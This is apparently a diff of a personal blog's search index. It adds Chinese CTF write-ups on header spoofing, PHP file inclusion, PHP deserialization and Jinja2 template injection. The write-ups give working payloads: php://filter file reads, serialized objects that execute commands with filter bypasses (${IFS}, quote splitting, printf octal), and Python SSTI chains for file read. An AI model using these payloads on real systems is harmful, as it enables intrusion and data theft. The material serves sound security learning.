@@ -7146,6 +7146,7 @@ O(log_2n)</script><p>时间内找到</p>
     <title>PHP2</title>
     <url>/2023/07/28/PHP2/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：phps</p>
+<span id="more"></span>
 <p><img src="/2023/07/28/PHP2/image-20230728102046248.png" alt="image-20230728102046248"></p>
 <p>扫描一下后台</p>
 <p><img src="/2023/07/28/PHP2/image-20230728102137281.png" alt="image-20230728102137281"></p>
@@ -7257,7 +7258,9 @@ O(log_2n)</script><p>时间内找到</p>
   <entry>
     <title>upload-labs</title>
     <url>/2023/07/30/upload-labs/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="实时修改网页的javascript代码"><a href="#实时修改网页的javascript代码" class="headerlink" title="实时修改网页的javascript代码"></a>实时修改网页的javascript代码</h3><p>f12在源代码中选择覆盖模块，选择随便一个文件夹并启用本地替代，在这里修改代码后保存刷新就可以成功修改js代码</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>upload-labs靶场的学习</p>
+<span id="more"></span>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="实时修改网页的javascript代码"><a href="#实时修改网页的javascript代码" class="headerlink" title="实时修改网页的javascript代码"></a>实时修改网页的javascript代码</h3><p>f12在源代码中选择覆盖模块，选择随便一个文件夹并启用本地替代，在这里修改代码后保存刷新就可以成功修改js代码</p>
 <p><img src="/2023/07/30/upload-labs/image-20230730175218320.png" alt="image-20230730175218320"></p>
 <h3 id="bp抓不到包"><a href="#bp抓不到包" class="headerlink" title="bp抓不到包"></a>bp抓不到包</h3><p>解决方案：将bp代理改成本机ip地址就可以解决，记得改代理服务器网络代理配置</p>
 <h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><img src="/2023/07/30/upload-labs/image-20230730165745487.png" alt="image-20230730165745487"></p>
@@ -7504,6 +7507,159 @@ O(log_2n)</script><p>时间内找到</p>
 <p>/proc/self/fd/fd[0-9]*(文件标识符)</p>
 <p>/proc/mounts</p>
 <p>/root/.ssh/known_hosts</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>XFF和referer</title>
+    <url>/2023/08/01/XFF%E5%92%8Creferer/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>XFF和referer的学习</p>
+<span id="more"></span>
+<h2 id="XFF和referer"><a href="#XFF和referer" class="headerlink" title="XFF和referer"></a>XFF和referer</h2><p>IP伪造</p>
+<p>TCP/IP层面的IP伪造很难实现，因为更改后很难实现正常的TCP通信，但在HTTP层面的伪造就显得很容易。可以通过伪造XFF头进行IP伪造</p>
+<p>XFF字段</p>
+<p>X-Forwarded-For(XFF)是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。通俗来说，就是浏览器访问网站的IP。一般格式：</p>
+<p>X-Forwarded-For: client1, proxy1, proxy2, proxy3<br>1<br>左边第一个是浏览器IP，依次往右为第一个代理服务器IP,第二个，第三个（使用逗号+空格进行分割）</p>
+<p>referer</p>
+<p>Referer 是 HTTP请求<code>header</code> 的一部分，当浏览器（或者模拟浏览器行为）向<code>web</code> 服务器发送请求的时候，头信息里有包含 Referer 。比如我在<code>www.sojson.com</code> 里有一个<code>www.baidu.com</code> 链接，那么点击这个<code>www.baidu.com</code> ，它的<code>header</code> 信息里就有：</p>
+<p>  Referer=<a href="https://www.sojson.com">https://www.sojson.com</a></p>
+<p>由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer 信息。</p>
+<p>空referer</p>
+<p>浏览器直接访问则请求包中不会含有referer</p>
+<p>referer的作用</p>
+<ul>
+<li>防盗链</li>
+</ul>
+<p>比如我只允许我自己的网站访问我自己的图片服务器，那我的域名是<code>www.sojson.com</code>，那么图片服务器每次取到Referer来判断一下是不是我自己的域名<code>www.sojson.com</code>，如果是就继续访问，不是就拦截。</p>
+<ul>
+<li>防止恶意请求</li>
+</ul>
+<p>比如自己的网站上，静态请求是<code>*.html</code>结尾的，动态请求是<code>*.shtml</code>，那么由此可以这么用，所有的<code>*.shtml</code>请求，必须Referer为我自己的网站。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>command_execution</title>
+    <url>/2023/08/02/command-execution/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：命令执行</p>
+<span id="more"></span>
+<p><img src="/2023/08/02/command-execution/image-20230802224011365.png" alt="image-20230802224011365"></p>
+<p>证明存在命令执行漏洞</p>
+<p><img src="/2023/08/02/command-execution/image-20230802091007434.png" alt="image-20230802091007434"></p>
+<p><img src="/2023/08/02/command-execution/image-20230802091125572.png" alt="image-20230802091125572"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>fileinclude-ctf</title>
+    <url>/2023/08/01/fileinclude-ctf/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：文件包含中php伪协议</p>
+<span id="more"></span>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">WRONG WAY! <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>过滤逻辑是如果file1和file2都不为空，则执行以下操作：</p>
+<ul>
+<li>检查file2内容是否等于hello ctf</li>
+<li>如果file2内容确实是hello ctf，则通过include函数包含file1文件</li>
+</ul>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p>
+<p>php://input 是个可以访问请求的原始数据的只读流，可以读取没有处理过的POST数据。</p>
+<p>所以构造payload</p>
+<p>?file1=php://filter/read=convert.base64-encode/resource=flag.php来读取flag.php文件</p>
+<p>&amp;file2=php://input，因为php://input读取没有处理过的post数据，所以需要用post传入hello ctf</p>
+<p>所以最终的payload是<code>?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</code>，并通过post方法将hello ctf传入file2中。</p>
+<p><img src="/2023/08/01/fileinclude-ctf/image-20230801133638511-16909005904471.png" alt="image-20230801133638511"></p>
+<p><img src="/2023/08/01/fileinclude-ctf/image-20230801133651459-16909005986622.png" alt="image-20230801133651459"></p>
+<p>base64解码即可</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>fileinclude</title>
+    <url>/2023/08/01/fileinclude/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：php://filter伪协议</p>
+<span id="more"></span>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;display_errors&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$lan</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;language&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$lan</span>)</span><br><span class="line">&#123;</span><br><span class="line">	@<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;english&quot;</span>);</span><br><span class="line">	@<span class="keyword">include</span>(<span class="string">&quot;english.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	@<span class="keyword">include</span>(<span class="variable">$lan</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>很简单可以看出来里面存在一个cookie，系统预设的cookie值为chinese或english，如果$lan存在则执行$lan.php</p>
+<p><img src="/2023/08/01/fileinclude/image-20230801091807401.png" alt="image-20230801091807401"></p>
+<p>所以很明显是在请求头中构造cookie：language=php://fifter=read/convert.base64-encode/resource=/var/www/html/flag，因为是get请求需要自己对cookie进行url编码<code>language%3Dphp%3A%2F%2Ffifter%3Dread%2Fconvert.base64-encode%2Fresource%3D%2Fvar%2Fwww%2Fhtml%2Fflag</code></p>
+<p><img src="/2023/08/01/fileinclude/image-20230801092218681.png" alt="image-20230801092218681"><br><img src="/2023/08/01/fileinclude/image-20230801092243480.png" alt="image-20230801092243480"><br><img src="/2023/08/01/fileinclude/image-20230801092300918.png" alt="image-20230801092300918"></p>
+<p><code>PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2YwMGJkZmE1NDMzYmZjNWY3YzIyMDEzMjAzN2I1OGY1fSI7DQo/Pg==</code>base64解密即可得到flag</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>unseping</title>
+    <url>/2023/08/01/unseping/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：反序列化</p>
+<span id="more"></span>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//唤醒操作</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$v</span>);<span class="comment">//过滤关键字</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));<span class="comment">//先base64解码在进行反序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析代码可以得到需要控制ctf参数输入的值就可以达成命令执行的效果</p>
+<ul>
+<li>__construct (）构造方法</li>
+</ul>
+<p>　　　　当使用 new 关键字实例化一个对象时，构造函数将会自动调用。一个类中只能存在一个构造函数。和普通函数类似构造函数也可以带有参数，如果构造函数有参数的话，那么在实例化时也需要传入对应的参数，例如<code>new Students($name, $age)。</code></p>
+<p>　　　　<strong>__construct的绕过：</strong></p>
+<p>　　　　反序列化时，类的构造函数即(__construct函数)不会被执行。</p>
+<ul>
+<li>__destruct(）折构方法</li>
+</ul>
+<p>　　　　析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。</p>
+<p> 　　  <strong>gc机制（Garbage Collection垃圾回收机制）：</strong></p>
+<p>　　　　在PHP中，没有任何变量指向这个对象时，这个对象就成为垃圾。PHP会将其在内存中销毁；这是PHP的GC垃圾处理机制，防止内存溢出。当一个PHP线程结束时，当前占用的所有内存空间都会被销毁，当前程序中所有对象同时被销毁。GC进程一般都跟着每起一个SESSION而开始运行的.gc目的是为了在session文件过期以后自动销毁删除这些文件.二、<strong>destruct /unset </strong>destruct() 析构函数，是在垃圾对象被回收时执行。unset 销毁1的是指向对象的变量，而不是这个对象。三、 Session 与PHP垃圾回收机制由于PHP的工作机制，它并没有一个daemon线程来定期的扫描Session信息并判断其是否失效，当一个有效的请求发生时，PHP 会根据全局变量 session.gc_probability和session.gc_pisor的值，来决定是否启用一个GC, 在默认情况下，session.gc_probability=1, session.gc_pisor =100也就是说有1%的可能性启动GC(也就是说100个请求中只有一个gc会伴随100个中的某个请求而启动).PHP垃圾回收机制的工作就是扫描所有的Session信息，用当前时间减去session最后修改的时间，同session.gc_maxlifetime参数进行比较，如果生存时间超过gc_maxlifetime(默认24分钟), 就将该session删除。但是，如果你Web服务器有多个站点，多个站点时,GC处理session可能会出现意想不到的结果，原因就是：GC在工作时，并不会区分不同站点的session。触发的具体操作可以将一个对象的值赋为新值,则原来的旧值会被回收。<br>　　　　**__destruct的具体触发条件：</p>
+<p>**</p>
+<p>　　　　主动调用<code>unset($obj):调用unset函数将指向对象的变量删除</code></p>
+<p>　　　　主动调用<code>$obj = NULL:指向对象的变量被置为空，导致原对象无法引用</code></p>
+<p>　　　　程序自动结束：程序结束后会自动将对象删除</p>
+<p>　　　　垃圾回收机制回收：说白了就是前三种情况总和</p>
+<p>　　　　<strong>__destruct触发具体实现：</strong></p>
+<p>　　　　（1）可以使用数组，给数组设置两个键值对，第一个键值对为 0=&gt;$obj(想要销毁的对象)，第二个键值对为1=&gt;NULL，将构造的数组进行序列化后把第二个键值对的键改为0，这样就可以使0这个键所指的对象无法被引用 从而触发__destruct方法。（当程序无法正常结束时）</p>
+<ul>
+<li><strong>__wakeup（）方法：</strong></li>
+</ul>
+<p>　　　　 unserialize()在调用前会检查是否存在一个<strong>wakeup方法。如果存在，则会先调用 </strong>wakeup方法，预先准备对象数据。__wakeup经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p>
+<p>　　　　 <strong>__wakeup的绕过：</strong></p>
+<p>　　　　 将需要进行反序列化的对象的序列化字符串中的成员数改为大于实际成员数即可。原理是：如果存在<strong>wakeup方法，调用 unserilize() 方法前则先调用</strong>wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;l&quot;&quot;s&#x27;</span>));   <span class="comment">//创建新类a，method=ping，args=array(&#x27;l&quot;&quot;s&#x27;)</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);	<span class="comment">//序列化a</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行后得到</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;ease&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;easemethod&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;ping&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;easeargs&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;l&quot;</span><span class="string">&quot;s&quot;</span>;&#125;&#125;</span><br><span class="line"><span class="attribute">Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo0OiJsIiJzIjt9fQ</span>==</span><br></pre></td></tr></table></figure>
+<p>所以payload是：<br><code>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo0OiJsIiJzIjt9fQ==</code></p>
+<p>传入ctf=payload</p>
+<p><img src="/2023/08/01/unseping/image-20230801172318089-16909006825661.png" alt="image-20230801172318089"></p>
+<p>发现一个名为flag_1s_here的文件夹，于是再ls flag_1s_here，但是由于flag被过滤，所以又要用引号绕过。同时空格也是被过滤了的，此处用IFS变量进行绕过。将$arg的值改为索要执行的命令l””s${IFS}f””lag_1s_here：</p>
+<p>构造的payload为<code>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyNDoibCIicyR7SUZTfWYiImxhZ18xc19oZXJlIjt9fQ==</code></p>
+<p><img src="/2023/08/01/unseping/image-20230801172440692-16909006904942.png" alt="image-20230801172440692"></p>
+<p>flag大概率是在flag_831b69012c67b35f.php中，目前想要执行cat flag_1s_here/flag_831b69012c67b35f.php来查看flag，cat，flag，php都可以用双引号绕过，空格用${IFS}绕过，/要用printf及$()绕过,bash shell /绕过为$(printf${IFS}”\57”)。令<code>\$arg=c&quot;&quot;at\$&#123;IFS&#125;f&quot;&quot;lag_1s_here\$(printf$&#123;IFS&#125;&quot;\57&quot;)f&quot;&quot;lag_831b69012c67b35f.p&quot;&quot;hp</code>。构造payload为Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo3NDoiYyIiYXQke0lGU31mIiJsYWdfMXNfaGVyZSQocHJpbnRmJHtJRlN9Ilw1NyIpZiIibGFnXzgzMWI2OTAxMmM2N2IzNWYucCIiaHAiO319</p>
+<p>(或者直接对整个要执行的命令用printf及$（）绕过。此时<code>\$arg=\$(printf$&#123;IFS&#125;&quot;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160(cat flag_1s_here/flag_831b69012c67b35f.php</code>的八进制或十六进制编码都可以)”)。</p>
+<p><img src="/2023/08/01/unseping/image-20230801172550210-16909006984463.png" alt="image-20230801172550210"></p>
+<p>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyNDoibCIicyR7TEZTfWYiImxhZ18xc19oZXJlIjt9fQ==</p>
+<p>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyNDoibCIicyR7SUZTfWYiImxhZ18xc19oZXJlIjt9fQ==</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>web_python_template_injection</title>
+    <url>/2023/08/02/web-python-template-injection/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：python模板注入 </p>
+<span id="more"></span>
+<p><img src="/2023/08/02/web-python-template-injection/image-20230802224943401.png" alt="image-20230802224943401"></p>
+<p>证明模板是jinja2或Twig</p>
+<p><img src="/2023/08/02/web-python-template-injection/image-20230802225028866.png" alt="image-20230802225028866"></p>
+<p>证明模板是jinja2</p>
+<p><img src="/2023/08/02/web-python-template-injection/image-20230802225350160.png" alt="image-20230802225350160"></p>
+<p>索引为40的值是file，可以用于文件读取</p>
+<p><img src="/2023/08/02/web-python-template-injection/image-20230802225502598.png" alt="image-20230802225502598"></p>
+<p>索引为71的值是site._Printer，可以用于命令执行</p>
+<p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')&#125;&#125;</code></p>
+<p><img src="/2023/08/02/web-python-template-injection/image-20230802225852313.png" alt="image-20230802225852313"></p>
+<p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()&#125;&#125;</code></p>
+<p><img src="/2023/08/02/web-python-template-injection/image-20230802230031381.png" alt="image-20230802230031381"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>web_unserialize</title>
+    <url>/2023/08/02/web-unserialize/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：反序列化，__wakeup绕过，正则表达式绕过</p>
+<span id="more"></span>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行逻辑：base64解码var变量，如果满足无论大小写以O或者C开头：数字：则结束进程并打印stop hacking！否则执行反序列化，反序列化会调用__wakeup方法，所以还需要绕过__wakeup方法</p>
